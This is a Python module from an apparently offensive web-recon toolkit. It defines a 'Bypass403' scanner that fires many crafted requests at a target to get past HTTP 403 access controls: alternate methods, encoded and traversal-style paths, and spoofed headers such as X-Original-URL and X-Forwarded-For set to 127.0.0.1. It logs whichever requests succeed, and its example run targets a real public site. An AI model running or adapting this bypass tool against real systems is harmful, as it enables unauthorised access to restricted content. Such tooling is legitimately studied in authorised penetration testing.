import time
from .base_scanner import Scanner, ScannerDefaultParams
from typing import Dict, List


#   --------------------------------------------------------------------------------------------------------------------
#
#   Attempt to bypass 403 using different methods
#
#   Ⓒ                                                                                                                Ⓒ
#   Ⓒ    This module was written in Python in order to integrate better with WebRecon, most methods were taken from  Ⓒ
#   Ⓒ    from this repo     ->      https://github.com/iamj0ker/bypass-403                                           Ⓒ
#   Ⓒ                                                                                                                Ⓒ
#
#   --------------------------------------------------------------------------------------------------------------------

# TODO go over path, etc... useragent

class Bypass403(Scanner):
    _DEF_RESULTS_PATH = "../../../../blackhat-python/web_attacks/web_recon/scan_results/"

    def __init__(self, target_keyword, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.target_url = self.target_url.strip("/")
        self.target_keyword = target_keyword.strip("/")

    def try_bypass(self) -> dict:
        results = dict()

        # methods

        req_path = f"{self.target_url}/{self.target_keyword}"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"Content-Length": "0"}
        results[self.send_request("POST", req_path, headers=headers)] = f"POST {req_path} -H Content-Length:0"

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"Content-Length": "0"}
        results[self.send_request("PUT", req_path, headers=headers)] = f"PUT {req_path} -H Content-Length:0"

        req_path = f"{self.target_url}/{self.target_keyword}"
        results[self.send_request("TRACE", req_path)] = f"TRACE {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}"
        results[self.send_request("DELETE", req_path)] = f"DELETE {req_path}"

        # encoding / path traversal

        req_path = f"{self.target_url}/%2e/{self.target_keyword}"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}/."
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}//{self.target_keyword}//"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/./{self.target_keyword}/./"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}..;/"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword};/"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}%20"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}%09"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}?"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}?anything"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}#"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}/*"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        # file extensions

        req_path = f"{self.target_url}/{self.target_keyword}.html"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}.php"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        req_path = f"{self.target_url}/{self.target_keyword}.json"
        results[self.send_request("GET", req_path)] = f"GET {req_path}"

        # headers

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Original-URL": self.target_keyword}
        results[self.send_request("GET", req_path,
                                  headers=headers)] = f"GET {req_path} -H X-Original-URL: {self.target_keyword}"

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Custom-IP-Authorization": "127.0.0.1"}
        results[self.send_request("GET", req_path,
                                  headers=headers)] = f"GET {req_path} -H X-Custom-IP-Authorization: 127.0.0.1"

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Forwarded-For": "http://127.0.0.1"}
        results[self.send_request("GET", req_path,
                                  headers=headers)] = f"GET {req_path} -H X-Forwarded-For: http://127.0.0.1"

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Forwarded-For": "127.0.0.1:80"}
        results[self.send_request("GET", req_path,
                                  headers=headers)] = f"GET {req_path} -H X-Forwarded-For: 127.0.0.1:80"

        req_path = f"{self.target_url}"
        headers = {"X-rewrite-url": self.target_keyword}
        results[self.send_request("GET", req_path,
                                  headers=headers)] = f"GET {req_path} -H X-rewrite-url: {self.target_keyword}"

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Host": "127.0.0.1"}
        results[self.send_request("GET", req_path, headers=headers)] = f"GET {req_path} -H X-Host: 127.0.0.1"

        return results

    def send_request(self, method, path, headers=None) -> int:
        time.sleep(self.request_cooldown)
        return self._make_request(method=method, url=path, headers=headers,
                                  verify=False, allow_redirects=True).status_code

    def _start_scanner(self, results_filename=None) -> Dict[int, List[str]]:
        results = self.try_bypass()
        ret_results = {scode: list() for scode in ScannerDefaultParams.SuccessStatusCodes}

        res_repr = str()
        for scode, req in results.items():
            if scode in ScannerDefaultParams.SuccessStatusCodes:
                res_repr += f"\n{scode} -> {req}"
                ret_results[scode].append(req)

        if results_filename and res_repr:
            with open(results_filename, "a") as rf:
                rf.write(res_repr)
                print(f"saved results -> {results_filename}")
        return ret_results


if __name__ == "__main__":
    bruter = Bypass403("https://owasp.org/", "/test")
    x = bruter.start_scanner()
    print(x)